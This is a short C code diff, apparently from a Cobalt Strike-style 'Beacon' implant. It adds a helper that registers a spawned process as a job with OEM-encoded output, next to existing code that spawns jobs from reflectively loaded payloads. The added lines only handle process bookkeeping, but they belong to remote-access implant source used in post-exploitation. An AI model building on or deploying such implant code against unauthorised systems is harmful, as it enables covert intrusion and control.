@@ -258,5 +258,11 @@ void JobSpawn(char* buffer, int size, BOOL x86, BOOL ignoreToken)
 	JobSpawnInternal(callbackType, waitTime, reflectiveLoaderOffset, payload, payloadLength, argument, argumentLength, description, descriptionLength, x86, ignoreToken);
 
 	BeaconDataFree(locals);
+}
 
+void JobRegisterProcessWithOemOutput(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite)
+{
+	PROCESS_INFORMATION lPi = { pi->hProcess, NULL, pi->dwProcessId, NULL };
+	JOB_ENTRY* job = JobRegisterProcess(&lPi, hRead, hWrite, "process");
+	job->callbackType = CALLBACK_OUTPUT_OEM;
 }
